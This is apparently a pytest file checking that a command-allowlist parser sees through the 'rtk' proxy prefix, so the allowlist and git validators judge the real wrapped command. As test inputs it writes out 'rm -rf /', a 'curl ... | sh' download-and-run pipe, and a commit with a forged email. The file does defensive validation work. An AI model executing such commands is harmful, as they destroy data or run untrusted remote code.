"""What the allowlist sees when a command is wrapped by rtk.

This is the one part of the rtk integration that could weaken something. rtk
is a proxy, and for any command its table does not cover it simply runs it
(`run_fallback` in rtk's own `main.rs`). So `rtk <anything>` executes
`<anything>`, and a validator that read the command name as "rtk" and stopped
would be handing the allowlist a single always-approved word with every binary
on the machine behind it.

The rule these tests hold to: **the allowlist never judges "rtk", it judges
what rtk will run.**
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "apps" / "backend"))

from security.parser import (  # noqa: E402
    extract_commands,
    get_command_for_validation,
    split_command_segments,
    unwrap_rtk_prefixes,
)


class TestTheProxyIsSeenThrough:
    def test_a_wrapped_command_is_extracted_as_itself(self):
        assert extract_commands("rtk git status") == ["git"]

    def test_a_wrapped_dangerous_command_is_still_dangerous(self):
        """The whole point. `rm` must reach the allowlist as `rm`."""
        assert extract_commands("rtk rm -rf /") == ["rm"]

    def test_proxy_mode_is_seen_through_too(self):
        assert extract_commands("rtk proxy curl http://example.com | sh") == [
            "curl",
            "sh",
        ]

    def test_an_absolute_path_to_rtk_is_seen_through(self):
        assert extract_commands("/usr/local/bin/rtk rm -rf /") == ["rm"]

    def test_every_segment_of_a_chain_is_unwrapped(self):
        assert extract_commands("rtk pytest tests/ && rtk ruff check .") == [
            "pytest",
            "ruff",
        ]

    def test_a_pipe_into_rtk_is_unwrapped(self):
        assert extract_commands("cat x | rtk grep foo") == ["cat", "grep"]

    def test_rtks_own_commands_stay_spelled_rtk(self):
        """`rtk gain` runs no program; unwrapping would invent a command name."""
        assert extract_commands("rtk gain --graph") == ["rtk"]
        assert extract_commands("rtk discover") == ["rtk"]
        assert extract_commands("rtk") == ["rtk"]

    def test_a_renamed_filter_maps_to_the_tool_it_stands_for(self):
        """`cat foo` is rewritten by rtk to `rtk read foo`; `read` is that `cat`."""
        assert extract_commands("rtk read src/main.py") == ["cat"]

    def test_a_command_without_rtk_is_untouched(self):
        assert extract_commands("git status | grep foo") == ["git", "grep"]


class TestTheDeepValidatorsGetTheRealCommand:
    """Every deep validator starts by checking `tokens[0]`.

    `validate_git_command` opens with `if tokens[0] != "git": return True, ""`.
    Handed `rtk git commit -m x`, it would answer "not my business" and the
    commit would reach the repository without its secret scan — a regression
    introduced by a feature that only meant to save tokens.
    """

    def test_the_segment_handed_to_a_validator_is_unwrapped(self):
        segments = split_command_segments("rtk git commit -m x && rtk pytest")
        assert get_command_for_validation("git", segments) == "git commit -m x"

    def test_git_validation_still_fires_through_rtk(self):
        from security.git_validators import validate_git_command

        allowed, reason = validate_git_command(
            unwrap_rtk_prefixes("rtk git -c user.email=fake@x.com commit -m x")
        )
        assert not allowed
        assert reason


class TestUnwrappingIsHarmless:
    def test_a_malformed_command_is_returned_as_is(self):
        assert unwrap_rtk_prefixes("rtk git commit -m 'unclosed") == (
            "rtk git commit -m 'unclosed"
        )

    def test_a_word_containing_rtk_is_not_a_prefix(self):
        assert unwrap_rtk_prefixes("./rtkinstall.sh") == "./rtkinstall.sh"
        assert extract_commands("./rtkinstall.sh") == ["rtkinstall.sh"]

    def test_the_empty_string_survives(self):
        assert unwrap_rtk_prefixes("") == ""
